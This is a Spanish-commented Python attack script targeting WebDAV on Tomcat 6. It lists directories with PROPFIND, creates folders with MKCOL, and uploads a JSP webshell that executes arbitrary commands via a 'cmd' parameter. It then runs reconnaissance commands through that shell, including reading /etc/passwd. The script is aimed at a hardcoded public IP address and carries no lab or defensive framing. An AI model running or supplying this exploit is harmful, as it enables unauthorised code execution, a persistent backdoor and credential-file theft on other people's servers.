import requests
import urllib3
import base64
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class WebDAVExploiter:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False

    def check_webdav_permissions(self):
        """Verifica permisos de WebDAV"""
        print("[*] Verificando permisos de WebDAV...")
        
        webdav_url = f"{self.base_url}/webdav/"
        
        # Verificar si podemos listar directorio
        try:
            response = self.session.request("PROPFIND", webdav_url, timeout=5)
            print(f"[+] WebDAV PROPFIND responde: {response.status_code}")
            if response.status_code == 207:  # Multi-Status
                print("[!] ¡Podemos listar directorio WebDAV!")
        except Exception as e:
            print(f"[-] Error PROPFIND: {e}")

    def upload_webshell_via_webdav(self):
        """Intenta subir una webshell mediante PUT de WebDAV"""
        print("\n[*] Intentando upload de webshell via WebDAV PUT...")
        
        # Webshell JSP para Tomcat 6
        jsp_shell = """<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>
<html>
<body>
<form method="post">
Command: <input type="text" name="cmd" size="50">
<input type="submit" value="Execute">
</form>
</body>
</html>"""
        
        # Múltiples ubicaciones posibles para upload
        upload_targets = [
            f"{self.base_url}/webdav/shell.jsp",
            f"{self.base_url}/webdav/cmd.jsp",
            f"{self.base_url}/webdav/test.jsp",
            f"{self.base_url}/webdav/exploit.jsp",
            f"{self.base_url}/webdav/uploads/shell.jsp",
            f"{self.base_url}/webdav/wwwroot/shell.jsp"
        ]
        
        for target_url in upload_targets:
            try:
                print(f"[*] Intentando upload a: {target_url}")
                response = self.session.request("PUT", target_url, data=jsp_shell, timeout=10)
                
                if response.status_code in [200, 201, 204]:
                    print(f"[!] ¡UPLOAD EXITOSO! Webshell en: {target_url}")
                    
                    # Verificar que se subió correctamente
                    verify_response = self.session.get(target_url, timeout=5)
                    if verify_response.status_code == 200:
                        print(f"[+] Webshell verificada y accesible")
                        return target_url
                else:
                    print(f"[-] Upload falló: {response.status_code}")
                    
            except Exception as e:
                print(f"[-] Error en upload: {e}")
        
        return None

    def exploit_webdav_mkcol(self):
        """Intenta crear directorios via MKCOL"""
        print("\n[*] Probando creación de directorios via MKCOL...")
        
        test_dirs = [
            f"{self.base_url}/webdav/uploads",
            f"{self.base_url}/webdav/testdir",
            f"{self.base_url}/webdav/shells"
        ]
        
        for dir_url in test_dirs:
            try:
                response = self.session.request("MKCOL", dir_url, timeout=5)
                if response.status_code in [200, 201, 204]:
                    print(f"[!] Directorio creado: {dir_url}")
            except Exception as e:
                print(f"[-] Error MKCOL: {e}")

    def execute_commands_via_shell(self, shell_url):
        """Ejecuta comandos mediante la webshell"""
        if not shell_url:
            return
            
        print("\n[*] Ejecutando comandos via webshell...")
        
        commands = [
            "whoami",
            "pwd",
            "ls -la",
            "cat /etc/passwd",
            "ipconfig",
            "dir",
            "uname -a"
        ]
        
        for cmd in commands:
            try:
                response = self.session.post(shell_url, data={"cmd": cmd}, timeout=10)
                if response.status_code == 200:
                    print(f"\n[+] Comando: {cmd}")
                    # Mostrar primeras líneas de resultado
                    lines = response.text.split('\n')
                    for line in lines[:10]:  # Mostrar solo primeras 10 líneas
                        if line.strip():
                            print(f"    {line.strip()}")
            except Exception as e:
                print(f"[-] Error ejecutando {cmd}: {e}")

    def comprehensive_webdav_attack(self):
        """Ataque completo a WebDAV"""
        print("=== EXPLOTACIÓN WEBDAV TOMCAT 6 ===")
        
        # 1. Verificar permisos
        self.check_webdav_permissions()
        
        # 2. Crear directorios
        self.exploit_webdav_mkcol()
        
        # 3. Subir webshell
        shell_url = self.upload_webshell_via_webdav()
        
        # 4. Ejecutar comandos
        if shell_url:
            self.execute_commands_via_shell(shell_url)
        else:
            print("[-] No se pudo subir webshell, intentando métodos alternativos...")
            self.alternative_upload_methods()

    def alternative_upload_methods(self):
        """Métodos alternativos de upload"""
        print("\n[*] Probando métodos alternativos de upload...")
        
        # Intentar mediante POST a servlets
        upload_urls = [
            f"{self.base_url}/examples/servlets/servlet/UploadServlet",
            f"{self.base_url}/examples/jsp/upload/upload.jsp",
            f"{self.base_url}/servlets/UploadServlet"
        ]
        
        for url in upload_urls:
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code == 200:
                    print(f"[+] Posible upload en: {url}")
            except:
                pass

# Ejecutar explotación WebDAV
webdav_exploiter = WebDAVExploiter("189.254.143.102")
webdav_exploiter.comprehensive_webdav_attack()